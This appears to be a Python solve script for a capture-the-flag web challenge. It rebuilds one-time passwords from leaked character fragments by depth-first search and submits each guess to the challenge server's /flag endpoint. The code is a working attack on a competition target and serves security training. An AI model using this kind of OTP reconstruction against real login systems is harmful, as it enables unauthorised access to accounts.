import json
import string
import random as rng
import requests

flag_len = 80
remote = "http://0.0.0.0:3000"
remote = "https://quickstyle.chall.lac.tf"

def combine(order):
    return "".join(o[0] for o in order) + order[-1][1:]

def get(threecombos, twocombos, start):
    """
    Other implementation I was working on.

    It's basically just use two's and if a three matches then pog.

    It seems to have 1%% chance of working???
    """
    order = [start]
    three = set(threecombos)
    two = set(twocombos)

    two.remove(start)

    edges = dict()
    for c in two:
        edges[c[0]] = edges.get(c[0], [])
        edges[c[0]].append(c)

    search = 0

    def dfs():
        nonlocal search
        search += 1
        if search > 1000000:
            return False
        if len(two) == 0:
            return True
        ee = edges.get(order[-1][1], [])
        possible = [e for e in ee if e in two]
        rng.shuffle(possible)
        possible.sort(key=lambda e: (
            2 * ((order[-1] + e[1]).lower() in three) +
            rng.random()
        ), reverse=True)

        for e in possible:
            two.remove(e)
            order.append(e)
            if dfs():
                return True
            order.pop()
            two.add(e)
        return False

    dfs()
    return combine(order)


def gyat(combos, start):
    threecombos = {c for c in combos if len(c) == 3}
    twocombos = {c for c in combos if len(c) == 2}
    return get(threecombos, twocombos, start)

with open("combos.json", "r") as fin:
    combos = json.load(fin)


for c in combos:
    if c["start"] == "":
        continue
    otp = gyat(c["combos"], c["start"])
    r = requests.get(f"{remote}/flag", params={"user": f"owo{c['key']}", "otp": otp})
    print(c["key"], otp, r.text)
